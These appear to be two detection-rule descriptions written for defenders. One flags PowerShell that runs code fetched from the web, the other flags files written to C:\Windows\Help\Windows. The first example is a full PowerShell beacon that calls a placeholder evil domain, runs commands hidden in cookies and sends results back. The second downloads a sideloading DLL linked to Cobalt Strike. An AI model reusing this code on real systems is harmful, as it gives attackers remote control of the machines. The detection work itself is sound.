metadata.title: RESEARCH: PowerShell Invoking Expression via Web script_block
metadata.description:
A script_block event associated with the use of PowerShell to attempt to invoke code retrieved from a remote URL was identified. This technique may indicate an adversary or malicious software is using this technique to download and execute arbitrary code on the system.

Example:
> powershell.exe" -exec bypass -c IEX "$url="https://<EVILDOMAIN>";$m="737060cd8c284d8af7ad3062f209582d";$h= "Mozilla/4.0 (compatible;MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Medica Center PC 6.0; .NET4.0c; .NET4.0E)"; $wait=1;function w{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$r=[System.Net.HttpWebRequest]::Create($url);$r.UserAgent=$h;$r.Headers.Add('If-Match',$m);$p=[System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$r.proxy=$proxy;return $r;}function delay {$random=(Get-Random) % 4; $jitter= $wait*$random; Sleep -Seconds $jitter; }while($true){delay;$r=w;try{$p=$r.GetResponse();}catch{continue;}$x=$p.GetResponseHeader("Set-Cookie");if(![string]::IsNullOrEmpty($x)){$c=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x));try{$o=invoke-expression "$c" 2>&1|Out-String;}catch{$o=$_.Exception|Out-String;}$o=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($o));$r=w;$r.Headers.Add('Cookie',$o);$r.GetResponse().close();}$p.close();}

It is possible that legitimate software or users will employ similar techniques.

metadata.title: RESEARCH: Malicious Directory C:\Windows\Help\Windows (filemod)
metadata.description:
A filemod event that features the path C:\Windows\help\Windows was identified on the system. This may indicate that malware has been deployed to the system.

Example:
> powershell -c iwr -uri hxxp://example.com:443/mpclient.dll -OutFile c:\windows\help\windows\mpclient.dll

In this example the Microsoft Defender executable is downloaded with a malicious 'mpclient.dll', which loads a Cobalt Strike payload from c0000015.log. In August 2022 SentinelONE described this sideloading approach being used to deploy Cobalt Strike in LockBit ransomware intrusions.
